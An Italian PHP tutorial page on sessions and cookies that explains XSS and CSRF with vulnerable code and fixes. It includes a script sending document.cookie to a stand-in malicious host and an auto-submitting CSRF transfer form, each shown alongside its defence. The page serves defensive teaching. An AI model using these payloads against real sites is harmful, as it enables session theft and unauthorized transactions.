[⬅️ [TORNA ALL'INDICE] ](../README.md)

## Esempi Pratici

### Esempio di Gestione Sessione
```php
// Login semplice
session_start();
$username = "mario";
$password = "password123";

// Verifica credenziali e salva in sessione
if ($username === "mario" && $password === "password123") {
    $_SESSION['logged_in'] = true;
    $_SESSION['username'] = $username;
}
```

In un'altra pagina, verifica se l'utente è loggato:

```php
session_start();
if (!isset($_SESSION['logged_in'])) {
    echo "Devi effettuare il login";
} else {
    echo "Benvenuto " . $_SESSION['username'];
}
```

### Esempio di Gestione Cookie
```php
// Salva un cookie semplice
setcookie('lingua', 'italiano', time() + (86400 * 30)); // dura 30 giorni
```

In un'altra pagina, leggi il cookie:

```php
if (isset($_COOKIE['lingua'])) {
    echo "La tua lingua è: " . $_COOKIE['lingua'];
} else {
    echo "Lingua non impostata";
}
```

## Vulnerabilità di Sicurezza

### Cross-Site Scripting (XSS)
XSS è una vulnerabilità che permette agli attaccanti di iniettare codice JavaScript maligno nel tuo sito web. Questo codice viene poi eseguito nel browser degli utenti che visitano il sito.

#### Esempio di Vulnerabilità XSS

Ecco un esempio di codice vulnerabile, dove il parametro 'name' viene mostrato direttamente senza sanitizzazione:

```php
<?php
echo "Benvenuto, " . $_GET['name'];
?>
```

Un attaccante potrebbe usare un URL come:
`http://tuosito.com/welcome.php?name=<script>document.cookie</script>`
Questo ruberebbe i cookie dell'utente.

Ecco invece il codice sicuro:

```php
<?php
echo "Benvenuto, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?>
```

#### Come i Cookie sono Vulnerabili a XSS

Un attaccante potrebbe inserire questo script maligno:

```javascript
<script>
  // Invia tutti i cookie a un server maligno
  fetch('https://malicious-site.com/steal-cookies?' + document.cookie);
</script>
```

Per proteggere i cookie, è necessario utilizzare le appropriate flag di sicurezza:

```php
setcookie("session_id", "123456", [
    'httponly' => true,    // Previene l'accesso via JavaScript
    'secure' => true,      // Solo HTTPS
    'samesite' => 'Strict' // Previene CSRF
]);
```

### Cross-Site Request Forgery (CSRF)
CSRF è un attacco che forza un utente autenticato a eseguire azioni indesiderate su un sito web dove è già autenticato.

#### Esempio di Vulnerabilità CSRF

Ecco una pagina vulnerabile di trasferimento denaro:

```php
<?php
if ($_POST['amount'] && $_POST['to']) {
    transferMoney($_POST['to'], $_POST['amount']);
}
?>
```

Un attaccante potrebbe creare una pagina maligna che sfrutta questa vulnerabilità:

```html
<html>
<body onload="document.forms[0].submit()">
    <form action="http://banca.com/transfer.php" method="POST">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to" value="attaccante">
    </form>
</body>
</html>
```

#### Protezione da CSRF

Per prima cosa, generiamo un token CSRF:

```php
<?php
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

Poi, includiamo il token nel form HTML:

```html
<form method="POST" action="/transfer.php">
    <input type="hidden" name="csrf_token" 
           value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="text" name="amount">
    <input type="text" name="to">
    <button type="submit">Trasferisci</button>
</form>
```

Infine, verifichiamo il token nella richiesta:

```php
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token non valido');
}
```

[⬅️ [TORNA ALL'INDICE] ](../README.md)